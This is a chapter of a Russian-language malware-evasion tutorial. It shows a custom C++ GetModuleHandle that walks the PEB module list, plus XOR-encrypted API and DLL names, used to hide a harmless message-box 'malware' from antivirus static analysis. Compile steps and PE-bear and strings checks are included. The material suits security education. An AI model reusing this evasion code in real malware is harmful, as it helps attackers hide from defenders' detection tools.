\newpage
\subsection{64. методы обхода AV/VM движков вредоносным ПО - часть 11 (часть 15 в блоге): реализация WinAPI GetModuleHandle. Простой пример на C++.}

﷽

![av-evasion](./images/92/2023-04-11_09-36.png){width="80%"}

Эта публикация является результатом моего собственного исследования попыток уклонения от антивирусных движков с помощью другого популярного трюка: реализация WinAPI GetModuleHandle.

### GetModuleHandle

`GetModuleHandle` - это функция Windows API (также известная как WinAPI), которая извлекает дескриптор загруженного модуля в адресном пространстве вызывающего процесса. Ее можно использовать для получения идентификаторов для связанных исполняемых или `DLL` файлов. Декларацию функции можно найти в заголовочном файле `Windows.h`:

```cpp
HMODULE GetModuleHandle(
LPCWSTR lpModuleName
);
```

При использовании `GetModuleHandle` нам не нужно вызывать `FreeLibrary` для освобождения модуля, поскольку он только извлекает дескриптор модуля, который уже загружен в процессе.

### практический пример. пользовательская реализация `GetModuleHandle`

Создание пользовательской реализации `GetModuleHandle` с использованием блока среды процесса (PEB) может помочь избежать обнаружения антивирусом (AV) в определенных сценариях.

Вы можете использовать `PEB` для доступа к списку загруженных модулей и поиска нужного модуля вручную.

Вот высокоуровневое описание шагов, которые вы должны предпринять для реализации пользовательской функции `GetModuleHandle` с использованием `PEB`:

- получить доступ к `PEB` для текущего процесса.
- найти `InMemoryOrderModuleList` в структуре Ldr `PEB`.
- выполнить итерацию по связанному списку загруженных модулей.
- сравнить базовое имя каждого модуля с желаемым именем модуля.
- если совпадение найдено, вернуть базовый адрес (который действует как дескриптор) модуля.

Итак, полный исходный код на языке C выглядит так:

```cpp
// custom implementation
HMODULE myGetModuleHandle(LPCWSTR lModuleName) {

  // obtaining the offset of PPEB from the beginning of TEB
  PEB* pPeb = (PEB*)__readgsqword(0x60);

  // for x86
  // PEB* pPeb = (PEB*)__readgsqword(0x30);

  // obtaining the address of the head node in a linked list 
  // which represents all the models that are loaded into the process.
  PEB_LDR_DATA* Ldr = pPeb->Ldr;
  LIST_ENTRY* ModuleList = &Ldr->InMemoryOrderModuleList; 

  // iterating to the next node. this will be our starting point.
  LIST_ENTRY* pStartListEntry = ModuleList->Flink;

  // iterating through the linked list.
  WCHAR mystr[MAX_PATH] = { 0 };
  WCHAR substr[MAX_PATH] = { 0 };
  for (LIST_ENTRY* pListEntry = pStartListEntry; pListEntry != ModuleList; 
  pListEntry = pListEntry->Flink) {

    // getting the address of current LDR_DATA_TABLE_ENTRY (which represents the DLL).
    LDR_DATA_TABLE_ENTRY* pEntry = 
    (LDR_DATA_TABLE_ENTRY*)((BYTE*)pListEntry - sizeof(LIST_ENTRY));

    // checking if this is the DLL we are looking for
    memset(mystr, 0, MAX_PATH * sizeof(WCHAR));
    memset(substr, 0, MAX_PATH * sizeof(WCHAR));
    wcscpy_s(mystr, MAX_PATH, pEntry->FullDllName.Buffer);
    wcscpy_s(substr, MAX_PATH, lModuleName);
    if (cmpUnicodeStr(substr, mystr)) {
      // returning the DLL base address.
      return (HMODULE)pEntry->DllBase;
    }
  }

  // the needed DLL wasn't found
  printf("failed to get a handle to %s\n", lModuleName);
  return NULL;
}
```

И добавлю свою собственную функцию для сравнения строк `Unicode`:      

```cpp
int cmpUnicodeStr(WCHAR substr[], WCHAR mystr[]) {
  _wcslwr_s(substr, MAX_PATH);
  _wcslwr_s(mystr, MAX_PATH);

  int result = 0;
  if (StrStrW(mystr, substr) != NULL) {
    result = 1;
  }

  return result;
}
```

### пример обхода AV

Давайте создадим простую "вредоносную программу", просто пример окна сообщения `meow-meow`:     

```cpp
/*
 * hack.cpp - GetModuleHandle implementation. C++ implementation
 * @cocomelonc
 * https://cocomelonc.github.io/tutorial/2023/04/08/malware-av-evasion-15.html
*/
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include <shlwapi.h>
#include <string.h>

#pragma comment(lib, "Shlwapi.lib")

int cmpUnicodeStr(WCHAR substr[], WCHAR mystr[]) {
  _wcslwr_s(substr, MAX_PATH);
  _wcslwr_s(mystr, MAX_PATH);

  int result = 0;
  if (StrStrW(mystr, substr) != NULL) {
    result = 1;
  }

  return result;
}

typedef UINT(CALLBACK* fnMessageBoxA)(
  HWND   hWnd,
  LPCSTR lpText,
  LPCSTR lpCaption,
  UINT   uType
);

// custom implementation
HMODULE myGetModuleHandle(LPCWSTR lModuleName) {

  // obtaining the offset of PPEB from the beginning of TEB
  PEB* pPeb = (PEB*)__readgsqword(0x60);

  // for x86
  // PEB* pPeb = (PEB*)__readgsqword(0x30);

  // obtaining the address of the head node in a linked list 
  // which represents all the models that are loaded into the process.
  PEB_LDR_DATA* Ldr = pPeb->Ldr;
  LIST_ENTRY* ModuleList = &Ldr->InMemoryOrderModuleList; 

  // iterating to the next node. this will be our starting point.
  LIST_ENTRY* pStartListEntry = ModuleList->Flink;

  // iterating through the linked list.
  WCHAR mystr[MAX_PATH] = { 0 };
  WCHAR substr[MAX_PATH] = { 0 };
  for (LIST_ENTRY* pListEntry = pStartListEntry; pListEntry != ModuleList; 
  pListEntry = pListEntry->Flink) {

    // getting the address of current LDR_DATA_TABLE_ENTRY (which represents the DLL).
    LDR_DATA_TABLE_ENTRY* pEntry = 
    (LDR_DATA_TABLE_ENTRY*)((BYTE*)pListEntry - sizeof(LIST_ENTRY));

    // checking if this is the DLL we are looking for
    memset(mystr, 0, MAX_PATH * sizeof(WCHAR));
    memset(substr, 0, MAX_PATH * sizeof(WCHAR));
    wcscpy_s(mystr, MAX_PATH, pEntry->FullDllName.Buffer);
    wcscpy_s(substr, MAX_PATH, lModuleName);
    if (cmpUnicodeStr(substr, mystr)) {
      // returning the DLL base address.
      return (HMODULE)pEntry->DllBase;
    }
  }

  // the needed DLL wasn't found
  printf("failed to get a handle to %s\n", lModuleName);
  return NULL;
}

// encrypted function name (MessageBoxA)
unsigned char s_mb[] = { 0x20, 0x1c, 0x0, 0x6, 0x11, 0x2, 0x17, 0x31, 0xa, 
0x1b, 0x33 };

// encrypted module name (user32.dll)
unsigned char s_dll[] = { 0x18, 0xa, 0x16, 0x7, 0x43, 0x57, 0x5c, 0x17, 0x9, 
0xf };

// key
char s_key[] = "mysupersecretkey";

// XOR decrypt
void XOR(char * data, size_t data_len, char * key, size_t key_len) {
  int j;
  j = 0;
  for (int i = 0; i < data_len; i++) {
    if (j == key_len - 1) j = 0;
    data[i] = data[i] ^ key[j];
    j++;
  }
}

int main(int argc, char* argv[]) {
  XOR((char *) s_dll, sizeof(s_dll), s_key, sizeof(s_key));
  XOR((char *) s_mb, sizeof(s_mb), s_key, sizeof(s_key));

  wchar_t wtext[20];
  mbstowcs(wtext, s_dll, strlen(s_dll)+1); //plus null
  LPWSTR user_dll = wtext;

  HMODULE mod = myGetModuleHandle(user_dll);
  if (NULL == mod) {
    return -2;
  } else {
    printf("meow");
  }

  fnMessageBoxA myMessageBoxA = (fnMessageBoxA)GetProcAddress(mod, (LPCSTR)s_mb);
  myMessageBoxA(NULL, "Meow-meow!","=^..^=", MB_OK);
  return 0;
}
```

Как вы видите, я также добавил строки шифрования `XOR` (имена функций и модулей).

### демо

Давайте посмотрим все в действии. Сначала скомпилируем нашу "вредоносную программу":

```bash
x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
-I/usr/share/mingw-w64/include/ \
-s -ffunction-sections -fdata-sections \
-Wno-write-strings -fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc -fpermissive
```

![av-evasion](./images/92/2023-04-11_11-01.png){width="80%"}      

И запустим на машине жертвы (`Windows 10 x64`):

```powershell
.\hack.exe
```

![av-evasion](./images/92/2023-04-11_11-03.png){width="80%"}

Как видите, просто выводим `meow` для корректности. Все работает отлично =^..^=

Если мы проанализируем наш двоичный файл через `PE-bear`:

![av-evasion](./images/92/2023-04-11_13-08.png){width="80%"}

![av-evasion](./images/92/2023-04-11_13-09.png){width="80%"}

или через `strings`:

```bash
strings ./hack.exe
```

![av-evasion](./images/92/2023-04-11_13-11.png){width="80%"}

![av-evasion](./images/92/2023-04-11_13-11_1.png){width="80%"}

В результате `GetModuleHandle` WinAPI скрытый: обходит антивирусные движки в определенных сценариях.

В следующем посте я рассмотрю собственную практическую реализацию `GetProcAddress`

Надеюсь, этот пост повысит осведомленность синих команд об этой интересной технике уклонения и добавит оружие в арсенал красных команд.

[MITRE ATT&CK: T1027](https://attack.mitre.org/techniques/T1027/)       
[AV evasion: part 1](https://cocomelonc.github.io/tutorial/2021/09/04/simple-malware-av-evasion.html)     
[AV evasion: part 2](https://cocomelonc.github.io/tutorial/2021/09/06/simple-malware-av-evasion-2.html)      
[GetModuleHandle](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea)         
[исходный код на github](https://github.com/cocomelonc/meow/tree/master/2023-04-08-malware-av-evasion-15)    
